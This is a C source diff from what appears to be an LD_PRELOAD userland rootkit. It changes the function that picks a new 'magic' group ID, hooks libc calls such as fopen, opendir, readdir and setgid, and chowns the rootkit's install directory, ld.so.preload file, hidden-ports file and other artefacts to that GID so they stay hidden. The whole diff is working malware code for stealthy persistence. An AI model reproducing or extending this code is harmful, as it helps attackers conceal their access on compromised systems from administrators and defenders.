@@ -1,30 +1,32 @@
-#ifdef READ_GID_FROM_FILE
-int changerkgid(gid_t *new){
-    hook(CFOPEN, COPENDIR, CREADDIR);
-
-    gid_t newgid;
-
+gid_t changerkgid(void){
+    hook(CFOPEN, COPENDIR, CREADDIR, CSETGID);
     srand(time(NULL));
-    newgid = rand()%59999;
-    while(newgid<10000) newgid = rand()%59999;
 
-    // got new gid. need to write it to GID_PATH.
-    char buf[8];
     FILE *fp;
-    
+    gid_t newgid;
+    int x = 3;
+    char buf[12];
+
+    // got new gid. write it.
     fp = call(CFOPEN, GID_PATH, "w");
     if(fp == NULL)
         return -1;
+
+    newgid = rand() >> x;
+    while((long)call(CSETGID, newgid) < 0)
+        newgid = rand() >> x++;
 
     snprintf(buf, sizeof(buf), "%d", newgid);
     fwrite(buf, 1, strlen(buf), fp);
     fclose(fp);
 
-    // gid written.
-    // now hide INSTALL_DIR, PRELOAD_FILE...
+    // now rehide erythin
     chown_path(GID_PATH, newgid);
     chown_path(INSTALL_DIR, newgid);
     chown_path(LDSO_PRELOAD, newgid);
+#ifdef AUTO_GID_CHANGER
+    chown_path(GIDTIME_PATH, newgid);
+#endif
 #ifdef HIDE_PORTS
     chown_path(HIDEPORTS, newgid);
 #endif
@@ -35,8 +37,10 @@ int changerkgid(gid_t *new){
     chown_path(INTEREST_DIR, newgid);
 #endif
 
+    // all 'static' paths have been hidden. hide everything in installdir.
     DIR *dp = call(COPENDIR, INSTALL_DIR);
-    if(dp == NULL) return -1;
+    if(dp == NULL)
+        return -1;
 
     struct dirent *dir;
     while((dir = call(CREADDIR, dp)) != NULL){
@@ -49,34 +53,5 @@ int changerkgid(gid_t *new){
     }
     closedir(dp);
 
-    *new = newgid;
-    return 0;
-}
-#endif
-
-
-gid_t readgid(void){
-#ifdef READ_GID_FROM_FILE
-    FILE *fp;
-    hook(CFOPEN);
-
-    fp = call(CFOPEN, GID_PATH, "r");
-    if(fp == NULL){
-        return MAGIC_GID;
-    }
-
-    char gidbuf[8];
-    fgets(gidbuf, 8, fp);
-    if(gidbuf == NULL){
-        fclose(fp);
-        return MAGIC_GID;
-    }
-    fclose(fp);
-
-    gid_t magicgid = atoi(gidbuf);
-    if(!magicgid) return MAGIC_GID;
-    return magicgid;
-#else
-    return MAGIC_GID;
-#endif
+    return newgid;
 }
